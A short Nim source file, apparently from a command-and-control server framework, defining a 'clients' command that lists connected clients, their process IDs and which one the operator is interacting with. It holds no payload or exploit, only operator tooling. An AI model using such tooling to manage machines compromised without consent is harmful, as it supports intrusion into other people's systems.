import std/[
  terminal, 
  asyncdispatch, 
  tables
]

import ../../types
import ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.clients:
    stdout.styledWrite fgGreen, "[+] ", $client, fgWhite
    stdout.styledWrite " PID: " & $client.pid
    stdout.styledWriteLine (if client in server.cli.handlingClient: " (interacting)" else: "")
  
  infoLog $server.clients.len & " clients"

let cmd*: Command = Command(
  execProc: execProc,
  name: "clients",
  aliases: @["c"],
  argsLength: 0,
  usage: @["clients"],
  description: "View clients that were connected and are currently connected",
  category: CCClientInteraction
)